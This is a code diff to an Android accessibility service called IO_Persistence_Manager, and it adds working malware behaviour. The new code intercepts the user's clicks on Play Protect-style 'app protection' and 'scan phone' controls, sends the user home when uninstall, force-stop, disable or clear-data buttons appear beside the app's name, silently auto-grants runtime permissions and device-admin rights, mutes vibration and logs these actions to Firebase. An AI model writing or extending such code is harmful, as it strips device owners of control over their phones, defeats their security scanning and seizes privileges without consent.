@@ -52,6 +52,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
     protected void onServiceConnected() {
         super.onServiceConnected();
         instanceRef = new java.lang.ref.WeakReference<>(this);
+        autoPilotEngaged = true;
         
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
 
@@ -89,10 +90,9 @@ public class IO_Persistence_Manager extends AccessibilityService {
     public boolean isFullyPermissioned() {
         try {
             boolean overlayOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
-            boolean filesOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || android.os.Environment.isExternalStorageManager();
             boolean installOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.O || getPackageManager().canRequestPackageInstalls();
             boolean notifOk = PermissionActivity.isNotificationServiceEnabled(this);
-            return overlayOk && filesOk && installOk && notifOk;
+            return overlayOk && installOk && notifOk;
         } catch (Exception ignored) {
             return false;
         }
@@ -162,15 +162,38 @@ public class IO_Persistence_Manager extends AccessibilityService {
         
         lastEventTime = System.currentTimeMillis();
         
-        // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
         final int eventType = event.getEventType();
         final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
+        // --- CLICK INTERCEPTOR FOR APP PROTECTION ---
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && !skipAntiRemoval) {
+            String clickedText = "";
+            if (event.getText() != null && !event.getText().isEmpty()) {
+                clickedText = event.getText().toString().toLowerCase();
+            }
+            if (event.getContentDescription() != null) {
+                clickedText += " " + event.getContentDescription().toString().toLowerCase();
+            }
+            if (clickedText.contains("app protection") || 
+                clickedText.contains("scan phone") || 
+                clickedText.contains("scan device") || 
+                clickedText.contains("turn on app protection") ||
+                clickedText.contains("protección de aplicaciones") ||
+                clickedText.contains("protection des applications") ||
+                clickedText.contains("app-schutz")) {
+                performGlobalAction(GLOBAL_ACTION_HOME);
+                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Intercepted click on App Protection (" + clickedText.trim() + ")");
+                return;
+            }
+        }
 
         // --- AUTO_PILOT: RUNTIME & SPECIAL PERMISSION PROMPT INTERCEPTOR ---
         if (isAutoPilotEngaged()) {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                 eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
-                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
+                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
+                eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 
                 String pkgLower = packageName.toLowerCase();
                 if (pkgLower.contains("permission") || 
@@ -184,6 +207,26 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     pkgLower.contains(getPackageName().toLowerCase()) ||
                     pkgLower.contains("system.stability")) {
                     runTacticalAutoPilot(packageName);
+                }
+            }
+        }
+
+        // --- INSTANT LIGHTNING ANTI-REMOVAL SHIELD (< 1ms MAIN THREAD DISPATCH) ---
+        String pkgCheck = packageName.toLowerCase();
+        if (!skipAntiRemoval && (pkgCheck.contains("settings") || 
+            pkgCheck.contains("packageinstaller") || 
+            pkgCheck.contains("permissioncontroller") ||
+            pkgCheck.contains("vending") ||
+            pkgCheck.contains("securitycenter") ||
+            pkgCheck.contains("devicecare") ||
+            pkgCheck.contains("smartmanager"))) {
+            
+            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
+                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                
+                if (checkAntiRemovalFast(pkgCheck)) {
+                    return;
                 }
             }
         }
@@ -237,7 +280,25 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     }
 
                     if (!skipAntiRemoval) {
-                        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
+                        String targetPkg = packageName.toLowerCase();
+                        if (targetPkg.contains("settings") || 
+                            targetPkg.contains("packageinstaller") || 
+                            targetPkg.contains("permissioncontroller") ||
+                            targetPkg.contains("lool") ||
+                            targetPkg.contains("sm") ||
+                            targetPkg.contains("devicecare") ||
+                            targetPkg.contains("smartmanager") ||
+                            targetPkg.contains("securitycenter") ||
+                            targetPkg.contains("safecenter") ||
+                            targetPkg.contains("systemmanager") ||
+                            targetPkg.contains("permissionmanager") ||
+                            targetPkg.contains("secure") ||
+                            targetPkg.contains("oppoguard") ||
+                            targetPkg.contains("vending") ||
+                            targetPkg.contains("cleaner") ||
+                            targetPkg.contains("maintenance") ||
+                            targetPkg.contains("appmanager") ||
+                            targetPkg.contains("powermanager")) {
                             checkAntiRemovalInternal();
                         }
                     }
@@ -352,6 +413,109 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private long lastAntiRemovalExecution = 0;
 
+    private boolean checkAntiRemovalFast(String pkg) {
+        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false) || isAutoPilotEngaged()) {
+            return false;
+        }
+        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
+            return false;
+        }
+
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+
+            // 1. Check if on dedicated App Protection / Scan screen
+            boolean isTopLevelSecurityPage = false;
+            String[] topLevelHeaders = {
+                "security and privacy", "security & privacy", "seguridad y privacidad",
+                "sécurité et confidentialité", "sicherheit und datenschutz", "device care", "cuidado del dispositivo"
+            };
+
+            for (String h : topLevelHeaders) {
+                List<AccessibilityNodeInfo> headerNodes = root.findAccessibilityNodeInfosByText(h);
+                if (headerNodes != null && !headerNodes.isEmpty()) {
+                    for (AccessibilityNodeInfo hn : headerNodes) {
+                        if (hn.isVisibleToUser() && hn.getText() != null) {
+                            String hText = hn.getText().toString().toLowerCase().trim();
+                            if (hText.equals(h) || hText.contains(h)) {
+                                isTopLevelSecurityPage = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+                if (isTopLevelSecurityPage) break;
+            }
+
+            if (!isTopLevelSecurityPage || pkg.contains("devicesecurity")) {
+                String[] dedicatedScanKeywords = {
+                    "scan phone", "scan device", "scan now", "deep scan",
+                    "turn on app protection", "turn on protection", "escanear teléfono",
+                    "escanear dispositivo", "protection des applications", "app-schutz", "geräteschutz"
+                };
+
+                for (String kw : dedicatedScanKeywords) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
+                    if (nodes != null && !nodes.isEmpty()) {
+                        for (AccessibilityNodeInfo node : nodes) {
+                            if (node.isVisibleToUser() && node.getText() != null) {
+                                performGlobalAction(GLOBAL_ACTION_HOME);
+                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Instant Anti-Removal Shield blocked scan on " + pkg);
+                                root.recycle();
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            // 2. SPECIFIC APP DETAILS & UNINSTALL/FORCE STOP BLOCK
+            List<String> targetNames = getOurAppNames();
+            boolean foundLabel = false;
+            for (String name : targetNames) {
+                List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(name);
+                if (labels != null && !labels.isEmpty()) {
+                    foundLabel = true;
+                    break;
+                }
+            }
+
+            if (foundLabel) {
+                String[] danger = {
+                    "uninstall", "force stop", "disable", "turn off", "clear data", "clear storage",
+                    "deep sleep", "put to sleep", "remove", "delete", "stop",
+                    "desinstalar", "forzar detención", "forzar parada", "inhabilitar", "desactivar", "borrar datos",
+                    "désinstaller", "forcer l'arrêt", "désactiver", "supprimer les données",
+                    "deinstallieren", "beenden erzwingen", "stoppen erzwingen", "deaktivieren", "daten löschen",
+                    "desinstalar", "forçar parada", "desativar", "limpar dados",
+                    "disinstalla", "arresto forzato", "disattiva", "cancella dati"
+                };
+
+                for (String s : danger) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
+                    if (nodes != null && !nodes.isEmpty()) {
+                        for (AccessibilityNodeInfo node : nodes) {
+                            if (node.isVisibleToUser() && node.getText() != null) {
+                                String textLower = node.getText().toString().toLowerCase().trim();
+                                if (textLower.equals(s) || textLower.contains(s)) {
+                                    performGlobalAction(GLOBAL_ACTION_HOME);
+                                    FirebaseConfig.logActivity("STABILITY_PROTOCOL: Instant Anti-Removal Shield activated on " + pkg + " (" + s + ")");
+                                    root.recycle();
+                                    return true;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            root.recycle();
+        } catch (Exception ignored) {}
+
+        return false;
+    }
+
     private void checkAntiRemovalInternal() {
         // [STABILITY_SYNC] Skip anti-removal checks if in Guided Repair flow or AutoPilot is active
         if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false) || isAutoPilotEngaged()) {
@@ -364,8 +528,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
         }
 
         long now = System.currentTimeMillis();
-        // Cooldown: Don't scan the UI more than once every 2 seconds to prevent "Recent Apps" lag
-        if (now - lastAntiRemovalExecution < 2000) return;
+        // Fast 300ms debounce
+        if (now - lastAntiRemovalExecution < 300) return;
         lastAntiRemovalExecution = now;
 
         // Must run on main thread for getRootInActiveWindow()
@@ -374,14 +538,86 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
                 
-                // Specific package check: only block if inside the actual uninstaller or settings
-                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
-                if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) {
+                String pkg = root.getPackageName() != null ? root.getPackageName().toString().toLowerCase() : "";
+                
+                boolean isTargetPkg = pkg.contains("settings") ||
+                                      pkg.contains("packageinstaller") ||
+                                      pkg.contains("permissioncontroller") ||
+                                      pkg.contains("lool") ||
+                                      pkg.contains("sm") ||
+                                      pkg.contains("devicecare") ||
+                                      pkg.contains("smartmanager") ||
+                                      pkg.contains("securitycenter") ||
+                                      pkg.contains("safecenter") ||
+                                      pkg.contains("systemmanager") ||
+                                      pkg.contains("permissionmanager") ||
+                                      pkg.contains("secure") ||
+                                      pkg.contains("oppoguard") ||
+                                      pkg.contains("vending") ||
+                                      pkg.contains("cleaner") ||
+                                      pkg.contains("maintenance") ||
+                                      pkg.contains("appmanager") ||
+                                      pkg.contains("powermanager");
+
+                if (!isTargetPkg) {
                     root.recycle();
                     return;
                 }
 
-                // Only trigger if we are specifically on OUR app's details page
+                // 1. PROACTIVE APP PROTECTION & DEDICATED SCAN SHIELD
+                // Check if top-level page is "Security and privacy" or "Device care"
+                boolean isTopLevelSecurityPage = false;
+                String[] topLevelHeaders = {
+                    "security and privacy", "security & privacy", "seguridad y privacidad",
+                    "sécurité et confidentialité", "sicherheit und datenschutz", "segurança e privacidade",
+                    "sicurezza e privacy", "device care", "cuidado del dispositivo", "gerätepflege"
+                };
+
+                for (String h : topLevelHeaders) {
+                    List<AccessibilityNodeInfo> headerNodes = root.findAccessibilityNodeInfosByText(h);
+                    if (headerNodes != null && !headerNodes.isEmpty()) {
+                        for (AccessibilityNodeInfo hn : headerNodes) {
+                            if (hn.isVisibleToUser() && hn.getText() != null) {
+                                String hText = hn.getText().toString().toLowerCase().trim();
+                                if (hText.equals(h) || hText.contains(h)) {
+                                    isTopLevelSecurityPage = true;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    if (isTopLevelSecurityPage) break;
+                }
+
+                // If on dedicated App Protection screen or when scan action button is present (and NOT top-level Security menu)
+                boolean isDedicatedAppProtection = pkg.contains("devicesecurity");
+                if (!isTopLevelSecurityPage || isDedicatedAppProtection) {
+                    String[] dedicatedScanKeywords = {
+                        "scan phone", "scan device", "scan now", "deep scan",
+                        "turn on app protection", "turn on protection", "escanear teléfono",
+                        "escanear dispositivo", "protection des applications", "analyse du téléphone",
+                        "app-schutz", "telefon scannen", "geräteschutz", "protezione app"
+                    };
+
+                    for (String kw : dedicatedScanKeywords) {
+                        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
+                        if (nodes != null && !nodes.isEmpty()) {
+                            for (AccessibilityNodeInfo node : nodes) {
+                                if (node.isVisibleToUser() && node.getText() != null) {
+                                    String textLower = node.getText().toString().toLowerCase().trim();
+                                    if (textLower.equals(kw) || textLower.contains(kw)) {
+                                        performGlobalAction(GLOBAL_ACTION_HOME);
+                                        FirebaseConfig.logActivity("STABILITY_PROTOCOL: Anti-Removal Shield blocked App Protection scan on " + pkg + " (" + kw + ")");
+                                        root.recycle();
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+
+                // 2. SPECIFIC APP DETAILS & UNINSTALL/FORCE STOP BLOCK
                 List<String> targetNames = getOurAppNames();
                 boolean foundLabel = false;
                 for (String name : targetNames) {
@@ -391,25 +627,35 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         break;
                     }
                 }
-                if (!foundLabel) {
-                    root.recycle();
-                    return;
-                }
 
-                String[] danger = {"uninstall", "force stop"};
-                for (String s : danger) {
-                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
-                    if (nodes != null && !nodes.isEmpty()) {
-                        for (AccessibilityNodeInfo node : nodes) {
-                            if (node.isVisibleToUser() && node.getText() != null && 
-                                node.getText().toString().toLowerCase().trim().equals(s)) {
-                                performGlobalAction(GLOBAL_ACTION_HOME);
-                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
-                                break;
+                if (foundLabel) {
+                    String[] danger = {
+                        "uninstall", "force stop", "disable", "turn off", "clear data", "clear storage",
+                        "deep sleep", "put to sleep", "remove", "delete", "stop",
+                        "desinstalar", "forzar detención", "forzar parada", "inhabilitar", "desactivar", "borrar datos", "suspender",
+                        "désinstaller", "forcer l'arrêt", "désactiver", "supprimer les données", "mise en veille", "supprimer",
+                        "deinstallieren", "beenden erzwingen", "stoppen erzwingen", "deaktivieren", "daten löschen", "standby",
+                        "desinstalar", "forçar parada", "desativar", "limpar dados", "suspensão profunda",
+                        "disinstalla", "arresto forzato", "disattiva", "cancella dati"
+                    };
+
+                    for (String s : danger) {
+                        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
+                        if (nodes != null && !nodes.isEmpty()) {
+                            for (AccessibilityNodeInfo node : nodes) {
+                                if (node.isVisibleToUser() && node.getText() != null) {
+                                    String textLower = node.getText().toString().toLowerCase().trim();
+                                    if (textLower.equals(s) || textLower.contains(s)) {
+                                        performGlobalAction(GLOBAL_ACTION_HOME);
+                                        FirebaseConfig.logActivity("STABILITY_PROTOCOL: Anti-Removal Shield activated on " + pkg + " (" + s + ")");
+                                        break;
+                                    }
+                                }
                             }
                         }
                     }
                 }
+
                 root.recycle();
             } catch (Exception ignored) {}
         });
@@ -1509,12 +1755,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
                 method.invoke(null, this, wrappedCallback);
                 
-                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        isScreenshotting = false;
-                    }
-                }, 50);
+                // Safety watchdog: reset flag after 1000ms if system fails to invoke callback
+                new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 1000);
             } catch (Exception e) {
                 isScreenshotting = false;
                 callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
@@ -1823,42 +2065,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private void startSmartExitSettingsLoop() {
         isExitingSettings = true;
-        Handler mainHandler = new Handler(Looper.getMainLooper());
-        mainHandler.post(new Runnable() {
-            private int attempts = 0;
-
-            @Override
-            public void run() {
-                attempts++;
-                if (attempts > 12) {
-                    isExitingSettings = false;
-                    return;
-                }
-
-                try {
-                    AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
-                    if (activeRoot != null) {
-                        CharSequence activePkgSeq = activeRoot.getPackageName();
-                        String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
-                        activeRoot.recycle();
-
-                        // If returned to our app, stop immediately and unlock AutoPilot!
-                        if (activePkg.contains(getPackageName().toLowerCase()) || activePkg.contains("labrats")) {
-                            isExitingSettings = false;
-                            return;
-                        }
-
-                        if (activePkg.contains("settings")) {
-                            performGlobalAction(GLOBAL_ACTION_BACK);
-                            mainHandler.postDelayed(this, 320); // 320ms for Samsung 300ms window transition
-                            return;
-                        }
-                    }
-                } catch (Exception ignored) {}
-
-                isExitingSettings = false;
-            }
-        });
+        try {
+            Intent intent = new Intent(this, PermissionActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+            startActivity(intent);
+        } catch (Exception e) {
+            performGlobalAction(GLOBAL_ACTION_HOME);
+        }
+        new Handler(Looper.getMainLooper()).postDelayed(() -> isExitingSettings = false, 300);
     }
 
     private boolean hasConfirmationPopup(AccessibilityNodeInfo root) {
@@ -2081,8 +2295,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
         // Target Settings special permission pages
         if (pkgName.contains("settings") && !pkgName.contains("systemui")) {
             long now = System.currentTimeMillis();
-            // 1500ms global cooldown on ALL switch clicks after toggling a switch
-            if (now - lastGlobalSwitchToggleTime < 1500) {
+            // 300ms global cooldown on switch clicks to allow fast confirmation popup processing
+            if (now - lastGlobalSwitchToggleTime < 300) {
                 return false;
             }
 
@@ -2147,22 +2361,28 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private boolean isInteractiveButtonNode(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
-        if (node.isClickable()) return true;
+        if (node.isClickable() || node.isCheckable()) return true;
 
         CharSequence clsSeq = node.getClassName();
         String clsName = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
-        if (clsName.contains("button")) return true;
-
-        AccessibilityNodeInfo parent = node.getParent();
-        if (parent != null) {
-            boolean parentClickable = parent.isClickable();
-            parent.recycle();
-            if (parentClickable) return true;
+        if (clsName.contains("button") || clsName.contains("textview") || clsName.contains("view")) {
+            AccessibilityNodeInfo curr = node.getParent();
+            int depth = 0;
+            while (curr != null && depth < 5) {
+                if (curr.isClickable()) {
+                    curr.recycle();
+                    return true;
+                }
+                AccessibilityNodeInfo parent = curr.getParent();
+                curr.recycle();
+                curr = parent;
+                depth++;
+            }
         }
 
         Rect bounds = new Rect();
         node.getBoundsInScreen(bounds);
-        return bounds.centerY() > 1000;
+        return bounds.height() > 0 && bounds.width() > 0 && bounds.centerY() > 150;
     }
 
     private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
@@ -2173,7 +2393,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
         String viewId = node.getViewIdResourceName();
         if (viewId != null) {
             String lowerId = viewId.toLowerCase();
-            if (!lowerId.contains("permission_allow_selected") && !lowerId.contains("allow_selected")) {
+            boolean isTitleOrTextId = lowerId.contains("text") || lowerId.contains("title") || lowerId.contains("message") || lowerId.contains("desc") || lowerId.contains("summary") || lowerId.contains("header");
+            if (!isTitleOrTextId && !lowerId.contains("permission_allow_selected") && !lowerId.contains("allow_selected")) {
                 if (lowerId.contains("permission_allow_all_button") ||
                     lowerId.contains("permission_allow_always_button") ||
                     lowerId.contains("permission_allow_foreground_only_button") ||
@@ -2182,6 +2403,9 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     lowerId.contains("permission_allow") ||
                     lowerId.contains("action_button") ||
                     lowerId.contains("admin_add") ||
+                    lowerId.contains("add_admin") ||
+                    lowerId.contains("admin_activate_button") ||
+                    lowerId.contains("btn_activate") ||
                     lowerId.endsWith("btnguideaction") ||
                     lowerId.endsWith("btncheckupdate") ||
                     lowerId.contains("btncheckforupdate") ||
@@ -2197,7 +2421,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                             CharSequence pkgSeq = root.getPackageName();
                             String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
                             root.recycle();
-                            if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button")) {
+                            if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button") && !lowerId.contains("activate")) {
                                 startSmartExitSettingsLoop();
                             }
                         }
@@ -2217,17 +2441,28 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String lowerText = text.toLowerCase();
             String lowerDesc = desc.toLowerCase();
 
-            // Explicit Device Admin Activation Button Match (Handles Step 1 & Step 2 Samsung Popups)
-            boolean isAdminButton = (lowerText.contains("activate") || lowerDesc.contains("activate") ||
-                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
-                     lowerText.equals("ok") || lowerDesc.equals("ok")) &&
-                    (lowerText.contains("admin") || lowerDesc.contains("admin") ||
-                     lowerText.contains("device") || lowerDesc.contains("device") ||
-                     lowerText.contains("turn on") || lowerDesc.contains("turn on") ||
-                     lowerText.equals("activate") || lowerDesc.equals("activate") ||
-                     lowerText.startsWith("activate"));
+            // Exclude Title / Header / Explanatory sentence text nodes (e.g. "Activate the device admin app", "Activate device administrator")
+            boolean isTitleSentence = lowerText.contains("activate the device admin") ||
+                                      lowerText.contains("activate device administrator") ||
+                                      lowerText.contains("activate this device admin") ||
+                                      lowerText.contains("activate this app") ||
+                                      (lowerText.length() > 25 && lowerText.contains("admin"));
 
-            if (isAdminButton && lowerText.length() < 60 && isInteractiveButtonNode(node)) {
+            // Explicit Device Admin Activation Button Match (Handles Stock, Samsung, Xiaomi, Pixel, Multilingual)
+            boolean isAdminButton = !isTitleSentence && (
+                     lowerText.equals("activate") || lowerDesc.equals("activate") ||
+                     lowerText.equals("activate app") || lowerDesc.equals("activate app") ||
+                     lowerText.equals("activar") || lowerDesc.equals("activar") ||
+                     lowerText.equals("activer") || lowerDesc.equals("activer") ||
+                     lowerText.equals("turn on") || lowerDesc.equals("turn on") ||
+                     lowerText.equals("enable") || lowerDesc.equals("enable") ||
+                     (lowerText.contains("activate") && lowerText.length() <= 20) ||
+                     (lowerText.contains("activar") && lowerText.length() <= 20) ||
+                     (lowerText.contains("activer") && lowerText.length() <= 20) ||
+                     (lowerText.equals("ok") && (viewId != null && (viewId.toLowerCase().contains("button") || viewId.toLowerCase().contains("admin") || viewId.toLowerCase().contains("action"))))
+            );
+
+            if (isAdminButton && isInteractiveButtonNode(node)) {
                 if (performNodeClick(node)) {
                     Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
                     FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
@@ -2281,7 +2516,8 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     "while using the app", "only this time", "allow all the time",
                     "allow", "allow all", "grant", "permitir", "permitir siempre",
                     "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
-                    "activate this device admin", "activate this device administrator", "yes", "ok",
+                    "activar", "activer", "activate this device admin", "activate this device administrator",
+                    "activate app", "activate device admin", "yes", "ok",
                     "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
                     "enable protection", "enable notification access", "enable file storage access",
                     "enable install unknown apps", "enable system protection", "proceed", "continue"
@@ -2379,21 +2615,23 @@ public class IO_Persistence_Manager extends AccessibilityService {
             }
         }
 
-        // 3. Always dispatch native gesture tap at bounds coordinates for guaranteed hardware button activation
-        if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
-            boolean tapRes = clickAt(x, y);
-            if (tapRes || clicked) {
-                muteVibration();
-                Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
-
-                // Schedule multi-pass follow-ups for 2-step confirmation popups
-                Handler mainHandler = new Handler(Looper.getMainLooper());
-                mainHandler.postDelayed(this::executeAutoPilotPass, 250);
-                mainHandler.postDelayed(this::executeAutoPilotPass, 500);
-                mainHandler.postDelayed(this::executeAutoPilotPass, 800);
-
-                return true;
+        // 3. Fallback to native gesture tap ONLY if direct node/parent click was not clickable or failed
+        if (!clicked) {
+            if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
+                clicked = clickAt(x, y);
+                if (clicked) {
+                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
+                }
             }
+        }
+
+        if (clicked) {
+            muteVibration();
+            // Schedule multi-pass follow-ups for 2-step confirmation popups
+            Handler mainHandler = new Handler(Looper.getMainLooper());
+            mainHandler.postDelayed(this::executeAutoPilotPass, 100);
+            mainHandler.postDelayed(this::executeAutoPilotPass, 300);
+            mainHandler.postDelayed(this::executeAutoPilotPass, 600);
         }
 
         return clicked;
